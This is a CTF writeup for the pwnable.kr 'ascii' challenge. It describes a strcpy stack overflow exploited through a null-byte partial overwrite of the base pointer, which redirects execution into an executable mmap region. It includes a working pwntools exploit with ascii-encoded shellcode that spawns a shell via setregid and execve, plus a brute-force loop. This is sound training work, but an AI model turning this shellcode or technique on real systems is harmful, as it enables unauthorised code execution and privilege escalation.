# pwnable.kr_solves
writeups/scripts for some of the pwnable.kr challenges i solved <br>
challenge settings: 32bit statically linked. <br>
this chall had an ascii only function. it also had an stack overflow that copied using strcpy.<br>


<img width="467" height="191" alt="image" src="https://github.com/user-attachments/assets/63790fe9-ec89-42c1-9861-c91ad383ac60" />
<img width="533" height="144" alt="image" src="https://github.com/user-attachments/assets/d53be2c1-3a5a-4277-a093-e04b4d162d12" />

meaning at the end of the string it had to write a nullbyte. that forbids any full ip overwrite. looking on ROPGadgets there was no avaiable gadgets even if i only partially overwrite the ip. mainly because it had to include the strcpy()ed nullbyte. in order to overcome that challenge i overwritten the first byte of the base pointer with with the nullbyte. when the function ends it will do ret and reclaim the basepointer with the nullbyte. and main will do ret and jump to the address below that. luckily while debugging i saw that the stack holds the adress that the input i insert is into which is 0x8000000. because of aslr its adress always changes but i can run it in a loop and eventually ill run to the adress ABOVE it ( because inorder to jump there i need that the basepointer will be above it)

<img width="625" height="48" alt="image" src="https://github.com/user-attachments/assets/6010dff3-5025-45aa-abf1-7ffd66166a5e" />
<img width="437" height="136" alt="image" src="https://github.com/user-attachments/assets/c15b0229-19eb-4c8e-8604-94caeab296b4" />
this is due to the fact the program uses mmap with a flag that forces it to be there. so theres no reason for leaking anything. additionally, it uses Write and Xecute flags, so when i jump to shellcode i put there. 1 problem that arose it that the shellcode must be ascii and it must be below 167 bytes ( since its the exact offset i need to overwrite the basepointer with the strcpy() nullbyte). for that, i used the pwntools ascii shellcode api and optimaized it.

```py
from pwn import *

context.clear(arch="i386", os="linux")

GID = 1043
'''
raw = asm(f"""
    xor eax, eax #  setregid(1043, 1043);
    mov bx, {GID}
    mov cx, {GID}
    mov al, 71
    int 0x80

    xor eax, eax #  execve("/bin//sh", NULL, NULL);
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb
    int 0x80
""")
asc = encoders.i386.ascii_shellcode.encode(raw)
'''
#
# this payload is the optimized version of the shellcode above. mainly it reduces the length of the nopsled ( the "P"s in the end is push eax, that holds 0x90)
payload = b'Q\\TX->"!!-"_``-~~~~P\\%!!!!%@@@@-7!!!-~!!!-~<--P-!0a!-{~~cP-*p!!-~~]!P-!!J!-9`~9P-!!!!-aOaf-~~~~P-!&!<-!~`~--~~~P-!!!!-!!H^-&A~~P-+!!!-~Rvz-~~~~P-#!\\!-~)~ePPPPPP\n'

print(len(payload))
print(payload)

for i in range(100):
    try:
        p = process("./ascii")
        # gdb.attach(p, '''
        # b* vuln+31
        # ''')
        p.send(payload)
        p.interactive()
    except:
        pass
```
